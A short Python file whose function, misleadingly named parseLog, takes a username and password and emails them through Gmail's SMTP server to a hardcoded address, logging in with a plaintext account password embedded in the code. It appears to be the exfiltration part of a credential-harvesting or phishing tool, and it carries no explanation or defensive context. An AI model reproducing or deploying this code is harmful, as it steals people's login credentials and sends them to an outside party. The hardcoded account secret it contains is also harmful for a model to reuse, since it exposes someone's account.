import smtplib, ssl

port = 465

def parseLog(username, password) :
   context = ssl.create_default_context()   
   msg = username + " " + password

   with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server :
      server.login("pythonemailscript111@gmail.com", "tsckgflccaecelou")
      server.sendmail("pythonemailscript111@gmail.com", "pythonemailscript111@gmail.com", msg)

